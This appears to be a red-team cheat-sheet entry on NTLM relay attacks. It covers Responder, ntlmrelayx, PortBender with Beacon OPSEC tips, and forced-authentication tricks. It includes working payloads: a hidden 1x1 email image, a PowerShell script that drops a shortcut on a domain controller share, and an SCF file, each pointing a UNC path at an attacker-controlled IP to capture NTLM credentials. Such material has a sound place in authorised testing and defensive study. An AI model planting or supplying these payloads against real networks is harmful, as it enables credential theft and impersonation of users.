# NTLM Relaying
NTLM authentication uses a 3-way handshake between a client and server. The high-level steps are as follows:
1.  The client makes an authentication request to a server for a resource it wants to access.
2.  The server sends a challenge to the client, whereas the challenge is using the hash of the users password.
3.  The client sends the encrypted response to the server, which contacts a domain controller to verify the encrypted challenge is correct.

In an NTLM relay attack, an attacker is able to intercept or capture this authentication traffic and effectively allows them to impersonate the client against the same, or another service.

An example:  
A client attempts to connect to an SQL server, but the attacker monitors the authentication mechanism and impersonates/replays the handshake, to connect to the CIFS service as he was the client.

In case a linux host is available tools like
* [[Responder]]
* [[ntlmrelayx]]

can be used.

But on Windows port 445 is always in use so the SMB port needs to be bended by [[PortBender]] which will be reflective injected.

⚠️This pretty much breaks any SMB service on the machine.

#opsec: The loaded driver will be located in the current working directory of the Beacon so choose `C:\Windows\System32\drivers` before you run.  


## Force Authentication
If you don't have the possibilities to fetch a request try some force authentication methods as shown below.

### 1x1 Images in Emails
Send emails with an invisible 1x1 image embedded in the mail. When being viewed the email client will attempt to download the image over the UNC path and trigger an NTLM authentication attempt.
`<img src="\\10.10.10.21\test.ico" height="1" width="1" />`

### Windows Shortcuts
The icon property of the Windows shortcut (.lnk) can can be used by pointing it to an UNC path which will trigger an NTLM authentication attempt just by being viewed.

The easiest way to create a shortcut is with PowerShell.
``````powershell
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc1\share\test.lnk")
$shortcut.IconLocation = "\\10.10.10.21\test.ico"
$shortcut.Save()
``````

### SCF file
SCF (Shell Command Files) files can be used to access a specific UNC path. Paste the code below into a text file and store it on a network share.
``````@log.scf
[Shell]
Command=``2
IconFile=\\X.X.X.X\share\test.ico
[Taskbar]
Command=ToggleDesktop
``````

## Tools
########
########


```meta
ttp: T1557.001
requirements:
results: 
description: 
```